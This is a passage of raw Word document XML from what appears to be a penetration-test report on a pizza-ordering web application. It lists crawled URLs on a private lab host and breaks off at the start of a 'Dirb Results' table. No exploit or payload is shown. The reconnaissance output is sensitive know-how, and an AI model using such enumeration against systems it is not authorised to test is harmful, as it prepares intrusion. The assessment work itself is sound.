        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img014.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BF37692" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img015.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06188480" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img016.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759FE495" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img017.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12113047" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img018.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3875C8EB" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img019.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A9B0E5" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img020.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF40CA6" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img021.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3695EC69" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img022.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309B4326" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img023.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6BDBD3" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img024.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77DD1161" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/img025.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F0AD5F" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/pizza/unavalable.png</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A380E86" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/images/special.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2391EBA5" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/inbox.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3009DEED" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/index.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B9F69A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3636E1" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/js/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE433C7" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/js/bootstrap.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A30B31" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/js/jquery.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF155F3" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/login-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B7B54ED" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/login-failed.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1575AF23" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/login-register.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ECC9D8A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/member-index.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC4B070" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>http://192.168.1.20/member-profile.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B1BBD1" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/member-ratings.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B7EEF75" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/order-exec.php?id=788</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB52DA1" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/partyhalls.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A42FF6" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/pictures</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19D0CC3B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/pictures/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A37C16E" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/pictures/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48049C89" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/pictures/fluffy.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F60C1B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/pictures/rick.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413B6DEE" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/ratings-exec.php?id=18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF522B2" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/ratings-success.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A40DB56" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/ratings.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452B2F75" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/register-exec.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C884B5" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/register-failed.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B97C821" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/reserve-exec.php?id=18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E5728E" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/reserve-success.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25687FE3" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/reset-failed.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34FEFA30" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/robots.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D0CB4B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/sitemap.xml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4913DD81" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/stylesheets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A256EDD" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/stylesheets/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291AD553" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/stylesheets/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05769E1C" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/stylesheets/images</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="329C3A31" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/stylesheets/images/icon_menu.gif</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E712F1C" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/stylesheets/user_styles.css</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47291FAF" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/swf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FB1669A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/swf/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B9D63F" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/swf/?C=D;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5D007C" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/swf/Carousel.swf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E86778" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/swf/default.xml</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D638F0" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/swf/swfobject.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5340ED" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/tables.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00EEB9F7" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/update-quantity.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6160E17D" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/validation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB7716B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/validation/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04870897" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/validation/?C=S;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B613FDA" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/validation/user.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDB7478" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3A101D79" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00300F7D" w:rsidP="008641AC">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="64" w:name="_Toc58836613"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>1.</w:t>
      </w:r>
      <w:r w:rsidR="00514AB7">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="008641AC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Dirb Results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="64"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid0"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="-108" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
